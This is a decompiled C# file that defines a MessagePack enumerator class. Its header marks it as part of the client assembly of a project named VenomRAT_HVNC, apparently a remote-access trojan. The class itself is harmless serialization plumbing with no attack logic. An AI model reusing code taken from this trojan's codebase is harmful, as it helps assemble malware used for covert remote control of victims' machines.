// Decompiled with JetBrains decompiler
// Type: MessagePackLib.MessagePack.MsgPackEnum
// Assembly: Client, Version=5.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: AF1838BC-6B25-40E4-9339-7F493AC3654D
// Assembly location: C:\Users\Younn\RiderProjects\VenomRAT_HVNC-5.0.4.0\VenomRAT_HVNC\bin\Debug\Client.exe

using System.Collections;
using System.Collections.Generic;


namespace MessagePackLib.MessagePack
{
  public class MsgPackEnum : IEnumerator
  {
    private List<MsgPack> children;
    private int position = -1;

    public MsgPackEnum(List<MsgPack> obj) => this.children = obj;

    object IEnumerator.Current => (object) this.children[this.position];

    bool IEnumerator.MoveNext()
    {
      ++this.position;
      return this.position < this.children.Count;
    }

    void IEnumerator.Reset() => this.position = -1;
  }
}
